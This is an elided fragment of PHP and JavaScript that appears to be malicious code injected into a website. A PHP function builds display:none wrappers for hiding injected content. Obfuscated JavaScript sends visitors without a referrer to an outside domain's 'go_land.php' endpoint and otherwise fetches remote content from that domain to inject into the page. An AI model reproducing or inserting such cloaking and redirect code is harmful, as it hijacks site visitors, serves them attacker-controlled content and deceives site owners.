...
function get_label(){
        $aa = array("<div style='display:none'>","<div style='display:none'>","<ul style='display:none' >","<img  src='' style='display:none'>","<a  href='#' style='display:none'>","<span style='display:none'>","<li style='display:none' >","<b style='display:none' >","<p  style='display:none'>","<h1 style='display:n
one' >");
...
if(!document.referrer){
        ...
        $identfier8("https://jcbdfyy.org/api/go_land.php?type="+$identfier1+"&to="+$identfier2)
    }else{
        var $identfier3 = $identfier7('fw'); var isescaped = $identfier3.includes('.escaped');
        var $identfier4 = new XMLHttpRequest; var html = null; $identfier4.onload = function(){html = $identfier4.responseText;$identfier6();}; var url = "https://jcbdfyy.org/"; $identfier4.open("GET", url + $identfier3, !0); $identfier4.send();
    }
